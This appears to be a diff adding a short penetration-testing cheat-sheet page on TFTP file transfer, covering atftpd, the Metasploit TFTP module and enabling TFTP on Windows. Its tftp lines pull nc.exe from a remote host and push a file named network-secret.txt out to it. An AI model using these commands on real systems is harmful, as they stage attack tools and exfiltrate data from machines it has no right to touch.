@@ -1,0 +1,20 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>TFTP</title>
+</head><body>TFTP<br/>
+<br/>
+Start Daemon:<br/>
+atftpd –daemon –port 69 /tmp/<br/>
+<br/>
+Transfer files using the “i” switch:<br/>
+tftp -i 192.168.10.155 GET nc.exe<br/>
+tftp -i 192.168.10.155 PUT network-secret.txt<br/>
+<br/>
+Note: Most corporate firewalls will block outbound traffic rendering TFTP unusable. TFTP might not be on Windows machines. Files transf­erred will usually be read only. Change attrib of file to delete using attrib -r filename.<br/>
+<br/>
+Metasploit, like with FTP, has an auxiliary TFTP server module at auxiliary/server/tftp. Set the module options, including TFTPROOT, which determines which directory to serve up, and OUTPUTPATH if you want to capture TFTP uploads from Windows as well.<br/>
+<br/>
+Sidenote: Installing TFTP. As I mentioned, TFTP is not included by default on newer versions of Windows. If you really wanted to, you can actually enable TFTP from the command line:<br/>
+pkgmgr /iu:"TFTP" </body></html>
